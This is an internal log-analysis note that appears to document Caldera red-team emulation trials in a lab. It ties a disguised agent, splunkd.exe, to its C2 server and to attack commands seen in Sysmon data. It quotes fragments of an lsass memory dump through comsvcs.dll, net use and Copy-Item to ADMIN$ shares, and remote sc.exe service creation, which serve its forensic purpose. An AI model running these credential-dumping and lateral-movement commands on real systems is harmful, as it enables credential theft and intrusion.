# Agent evidence: splunkd.exe is the Caldera agent (T5 step 1)

**Date:** 2026-11-10 · **Method:** read-only SQL on `events_dedup` of `data/processed/s0N_t00.sqlite3` (data-checker report; s02 stray-run check repeated by the coordinator). Nothing here uses `out/log_check/**` or any stitcher.

## Claim and result
`C:\Users\Public\splunkd.exe` is the Caldera (Sandcat) agent, and the attack commands are its descendants. Nothing in the data contradicts this.
- **Server and port.** Every Sysmon 3 from `splunkd.exe` that is not mDNS (5353) goes to `192.168.50.50:8888`. The 4688 launch line reads `"C:\Users\Public\splunkd.exe" -server http://192.168.50.50:8888 -group red|foothold|pivot_adm…`, parent `svchost.exe` (scheduled task, Option D).
- **Children.** Sysmon 1 with `parent_image` ending `splunkd.exe` are `powershell.exe` commands. The attack commands (`rundll32 … comsvcs.dll MiniDump`, `net use`, `sc.exe \\<ip>`, `Invoke-Command`) are grandchildren of splunkd through that `powershell.exe`.
- **Accounts.** Sysmon 1/3 show the user token (svc_backup, admin_it, `system` for the legacy ep-02 agent; svc_sql appears in the DB only as credentials in command lines, not as an agent token). 4688 `subject_account` is `lab\endpoint-0N$` for the splunkd launch lines (Task Scheduler (svchost) starts the task); use Sysmon `account_name` as the agent identity, not 4688 `subject_account`.

## Counts (Sysmon 3, splunkd → 192.168.50.50:8888, per host, ALL DATES in the DB)
Negative check: in every development DB the only destination ports of splunkd Sysmon 3 are 5353 (mDNS) and 8888 (s02 14/4, s03 159/16, s04 24/4, s05 197/19, s06 181/20, s07 33/12 rows of 5353/8888). ep-03 has no agent in the handoff §19.2 table; its splunkd rows (s03, s05, s06) are dated 2026-09-11…22 (parent powershell.exe/svchost), before the trial, and are excluded by the run-day rule.
| Trial | ep-01 | ep-02 | ep-03 |
|---|---|---|---|
| s02 | 3 | 1 | 0 |
| s03 | 3 | 0 | 13 |
| s04 | 3 | 1 | 0 |
| s05 | 3 | 2 | 14 |
| s06 | 3 | 4 | 13 |
| s07 | 6 | 6 | 0 |

Sysmon 1 children of splunkd, by host: s02 ep-01 2, ep-02 2; s03 ep-01 5, ep-03 10; s04 ep-01 5, ep-02 1; s05 ep-01 5, ep-02 4, ep-03 10+; s06 ep-01 6, ep-02 2, ep-03 9; s07 ep-01 7, ep-02 2. 4688 rows with parent splunkd: s02 6/4/0, s03 8/0/16, s04 8/2/0, s05 8/6/16, s06 9/4/16, s07 10/4/0 (ep-01/02/03).

## Command lines that name another host (agent tree, 200-char view)
| Trial | Host | Time (UTC) | Account | Names target |
|---|---|---|---|---|
| s02 | ep-01 | 05:42:46–47 | svc_backup | `Copy-Item … \\192.168.50.22\ADMIN$\PktDrop.exe; sc.exe \\192.168.50.22 create/start PktDropService` |
| s04 | ep-01 | 10:57:37 | svc_backup | `net use \\192.168.50.22\IPC$ … ; Copy-Item …Stage.exe \\192.168.50.22\ADMIN$` |
| s05 | ep-01 | 07:10:47 | svc_backup | `net use \\192.168.50.22\IPC$ … PktD…` |
| s06 | ep-01 | 09:04:34 | svc_backup | `net use \\192.168.50.22\ADMIN$ /user:LAB\admin_it …; sc.exe \\192.168.50.22 create Be…` |
| s07 | ep-01 | 09:17:54, 09:19:30 | svc_backup | `net use … /user:LAB\svc_backup … Xpay…`; `SVC_SQL_PW … /user:LAB\svc_sql … Ypay.exe` |
| s03 | ep-01 | 09:41:33 | admin_it | `Invoke-Command -Comp…` (target is past the 200-char cut) |
| s05 | ep-02 | 07:12:45 | admin_it | `PSCredential("LAB\admin_it"…` (target past the cut) |
| s06 | ep-01 | 09:03:02, 09:03:50 | svc_backup | `PSCredential('LAB\admin_it'…` ×2 (target past the cut) |

The WinRM lines (s03, s05, s06) must be read from the full `command_line` (or the decoded `-enc`) at build time; the 200-char view cannot show the host. s07 shows `svc_backup` for both X and Y hops at the agent level (handoff item 0d); the Y line names `svc_sql` credentials.

## Findings that change the key
1. **s02 has a second, stray execution on ep-02.** The legacy ep-02 agent (group `red`, account `system`) ran the same S02 ability earlier: dump at 05:41:31–32 (rundll32 → lsass, Sysmon 10 pair 05:41:32.011/.023) and `sc.exe \\192.168.50.22 create/start PktDropService` at 05:42:05. 192.168.50.22 is ep-02's own IP, so this is a self-targeted command, not a cross-host move. The real attack is the ep-01 `svc_backup` run: dump 05:42:00 (Sysmon 10 pair 05:42:00.120/.133), `sc.exe \\192.168.50.22` 05:42:47. The ep-02 run is recorded as `stray_agent_ep02`, `unconfirmed`, outside the attack paths. Handoff §19.2 lists the ep-02 `SandcatAgent` as legacy, "not used for identity scenarios"; this is its footprint. Same ep-02 pattern to check in s04 (ep-02 system child, 1 row).
2. **DBs hold host logs that predate the trial.** s05/s06/s07 contain ep-02 splunkd events at 2026-10-12 07:03–07:06 (the `pivot_adm` agent start), and s03/s05/s06 contain ep-03 splunkd events dated 2026-09-11…09-22 (parent `powershell.exe`/`svchost`). They are not attack steps; the key window (AK-12) and the run-day rule exclude them.
3. **s01 shares ep-01 source logs with s02** (identical 05:24–05:35 events). s01 t00 is already excluded (decision 001, 019).
4. **No 4104 or 4103 line carries a parent chain.** 4104 text is in `field_values_json` (ScriptBlockText), not `raw_event`; `powershell_host_application` is NULL. The agent link for PowerShell is by command text and session, never by 4104 parentage.
5. **s05 ep-02 has no `net`/`sc` grandchildren** (its hop 2 is `Invoke-Command`, WinRM). s03 shows no remote `powershell` grandchild on ep-01. Both are expected for WinRM (the work runs in `wsmprovhost` on the target).
6. **Truncation.** The 200-char view hides targets in `Invoke-Command` lines; the helper reads the full column.

## Not verified here
That the Caldera operations themselves match the handoff steps cannot be proven from logs alone; this is why every step carries a `status`, and why the lost operation logs will be used later only as a cross-check (decision 020).
